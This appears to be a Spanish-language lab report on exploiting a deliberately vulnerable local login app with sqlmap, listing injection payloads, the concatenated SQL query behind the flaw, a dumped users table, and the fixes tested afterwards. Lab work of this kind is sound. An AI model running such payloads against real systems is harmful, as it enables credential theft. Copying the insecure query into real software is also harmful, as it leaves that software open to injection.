# Resultados — Fase 3: SQL Injection automatizada con sqlmap

**Objetivo:** demostrar la explotación automatizada de la vulnerabilidad SQL
Injection del login de `v1-insecure` (OWASP A03:2021 — Injection) y el impacto
real: extracción completa de las credenciales almacenadas.

**Fecha de ejecución:** 2026-07-31 — sqlmap 1.8.4 contra `http://localhost:5000`

---

## 1. Metodología

Se automatizó el ataque en 3 pasos con `sqlmap/automate_sqlmap.sh`:

| Paso | Comando sqlmap | Objetivo |
|------|----------------|----------|
| 1. Detección | `--data "username=admin&password=admin123"` | Confirmar el parámetro y técnica inyectable |
| 2. Enumeración | `--tables` | Listar las tablas de la BD |
| 3. Extracción | `--dump -T users` | Volcar credenciales |

Los logs completos quedan en `sqlmap/output/sqlmap_*.log`.

## 2. Detección

sqlmap identificó el **parámetro `username`** del formulario `POST /login` como
vulnerable con **dos técnicas**:

```
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 8018=8018 AND 'ppnt'='ppnt&password=admin123

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: username=admin' AND 8071=LIKE(CHAR(65,66,67,68,69,70,71),
            UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PAxP'='PAxP&password=admin123
```

DBMS identificado: **SQLite**. La causa raíz es la concatenación de strings en
`v1-insecure/app.py:82`:

```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```

## 3. Extracción de datos

sqlmap volcó la tabla `users` completa, exponiendo todas las credenciales en
texto plano (la v1 ni siquiera las almacena hasheadas):

```
Database: <current>
Table: users
[3 entries]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | admin123 | admin    |
| 2  | 123456   | ana      |
| 3  | password | pedro    |
+----+----------+----------+
```

Los datos también quedaron en CSV en
`~/.local/share/sqlmap/output/localhost/dump/SQLite_masterdb/users.csv`.

## 4. Análisis y contramedidas

| Riesgo | Detalle |
|--------|---------|
| **Confidencialidad** | Todas las credenciales son recuperables sin autenticación |
| **Disponibilidad** | Time-based blind permite forzar bloqueos del servidor (heavy query) |
| **Escalabilidad** | El dump automático no requiere conocimientos previos del atacante |

**Contramedidas implementadas en `v2-secure` (Fase 2):**

1. **Queries parametrizadas** (`?` placeholders) en `v2-secure/app/auth.py:42` —
   sqlmap no detecta inyección:
   ```python
   user = db.execute("SELECT * FROM users WHERE username = ?", (username,))
   ```
2. **Hashing con bcrypt** — incluso si se filtrara la BD, las contraseñas no
   son reversibles.
3. **Mensajes de error genéricos** — no revelan si el usuario existe ni la query.
4. **CSRF activo** — impide el POST forzado de credenciales.

## 5. Verificación de la contramedida

Para confirmar que v2 no es explotable, se ejecutó el mismo paso de detección
contra el login seguro (con token CSRF + Referer, como lo haría un navegador):

```bash
sqlmap -u "https://localhost:8443/login" \
       --data "username=admin&password=admin123&csrf_token=<token>" \
       --headers "Cookie: <session>; Referer: https://localhost:8443/login"
```

Resultado esperado: sin parámetros inyectables → **SQL Injection mitigada**.
